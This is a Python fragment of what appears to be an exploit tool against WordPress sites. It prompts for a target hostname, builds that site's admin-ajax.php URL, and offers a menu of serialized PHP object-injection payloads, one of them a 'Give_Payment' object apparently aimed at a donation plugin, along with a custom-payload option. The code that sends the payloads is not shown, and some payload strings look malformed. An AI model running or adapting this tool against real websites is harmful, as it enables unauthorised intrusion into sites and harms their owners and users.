import logging


def get_target_url():
    while True:
        host = input("Enter the target hostname (e.g., example.com): ").strip()
        if host:
            host = host.replace('http://', '').replace('https://', '').replace('www.', '')

            url = f"https://{host}/wp-admin/admin-ajax.php"

            logging.info(f"Constructed URL: {url}")
            return url
        else:
            logging.warning("Hostname cannot be empty.")


def display_payload_options():
    payloads = {
        '1': {'name': 'Give_Payment Exploit', 'payload': 'O:12:"Give_Payment":1:{s:7:"give_id";s:10:"malicious";}'},
        '2': {'name': 'Simple String Injection', 'payload': '"Simple String Injection"'},
        '3': {'name': 'Serialized Array Exploit', 'payload': 'a:2:{i:0;s:4:"test";i:1;s:10:"malicious";}'},
        '4': {'name': 'Custom Payload', 'payload': None}
    }
    print("Select the type of payload you want to send:")
    for key, value in payloads.items():
        print(f"{key}: {value['name']}")
    return payloads


def get_payload():
    payloads = display_payload_options()
    while True:
        choice = input("Enter the number of the payload you want to use: ").strip()
        if choice in payloads:
            if choice == '4':
                custom_payload = input("Enter your custom payload: ").strip()
                if custom_payload:
                    return custom_payload
                else:
                    logging.warning("Custom payload cannot be empty.")
            else:
                return payloads[choice]['payload']
        else:
            logging.warning("Invalid choice. Please select a number from the list.")